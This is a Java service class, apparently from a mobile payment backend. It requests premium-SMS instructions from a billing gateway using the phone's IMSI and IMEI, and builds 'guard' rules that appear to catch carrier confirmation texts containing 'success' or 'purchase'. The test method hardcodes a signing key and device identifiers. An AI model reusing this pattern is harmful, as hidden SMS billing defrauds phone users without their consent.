package com.jxt.pay.appclient.service.dynamic.net;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.qlzf.commons.helper.DateHelper;
import com.qlzf.commons.helper.MD5Encrypt;

public class ZcVccDynamicService implements IDynamicService{

	private static final String TYPE = "zcVcc";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "pid={pid}&timeStamp={timeStamp}&svcid={svcid}&callbackData={callbackData}&imsi={imsi}&imei={imei}&sign={sign}";
	
	private static final Guard guard0 = new Guard("10655477","成功|购买",2880,"1",0);
	private static final Guard guard1 = new Guard("10655","",960,null,1);
	
	private static SimpleDateFormat sdf = new SimpleDateFormat();
	
	static{
		sdf.applyPattern("yyyyMMddHHmmss");
	}
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String pid = map.get("pid");
			String svcid = map.get("svcid");
			String timeStamp = sdf.format(new Date());
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			String callbackData = channel.substring(channel.length() - 10);
			String key = map.get("key");
			
			String sign = MD5Encrypt.MD5Encode("pid="+pid+"&timeStamp="+timeStamp+"&key="+key).toLowerCase();
			
			String param = REQUESTMODEL.replace("{pid}",pid).replace("{svcid}",svcid).replace("{timeStamp}",timeStamp).replace("{callbackData}",callbackData).replace("{imei}",imei).replace("{imsi}",imsi).replace("{sign}",sign);
			
			String responseJson = GetData.getData(url, param);
			
			xml = parseJson(responseJson);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parseJson(String responseJson){
		
		if(responseJson != null && responseJson.length() > 0){
			
			try{
				JSONObject jo = new JSONObject(responseJson);
				
				if(jo.has("resultCode")){
					String resultCode = jo.getString("resultCode");
					
					if("0".equals(resultCode)){
						
						String smsmsg = jo.getString("sms");
						String smsport = jo.getString("accessNo");
					
						List<Sms> smsList = new ArrayList<Sms>();
						
						Sms sms = new Sms();
						
						sms.setSmsContent(smsmsg);
						sms.setSmsDest(smsport);
						sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
						
						smsList.add(sms);
						
						Sms guardSms = new Sms();
						
						List<Guard> guardList = new ArrayList<Guard>();
						
						guardList.add(guard0);
						guardList.add(guard1);
						
						guardSms.setGuardList(guardList);
						
						smsList.add(0, guardSms);
							
						return XstreamHelper.toXml(smsList);
					}else{
						return DynamicUtils.parseError("597");
					}
				}
				
			}catch(Exception e){
				
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
//		http://121.14.38.20:25494/if_mtk/service?imsi=460004014262556&sid=de68ad65a7dcf01d76926374aa95ac2c&paycode=30000873055601&app_id=300008730556&channel_id=530&operation=102&imei=865308021063756
		String url = "http://vcc.geiliyou.com/vcc_gate_zc/fee.php";//?cmd=6&price=8&g=10&f=18&imei=860174010602000&imsi=460030912121002&phone=13800138000";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("type", "zcVcc");
		map.put("channel", "10B101a087654322");
		map.put("pid", "BJLX");
		map.put("svcid", "BJLX_TTBS_28");
		map.put("key", "641fd94035e0ce20e25b244eac170603");
		map.put("imsi","460015861061221");
		map.put("imei","357748050348062");
		
		System.out.println(new ZcVccDynamicService().dynamic(map));
		
		
	}

	
}
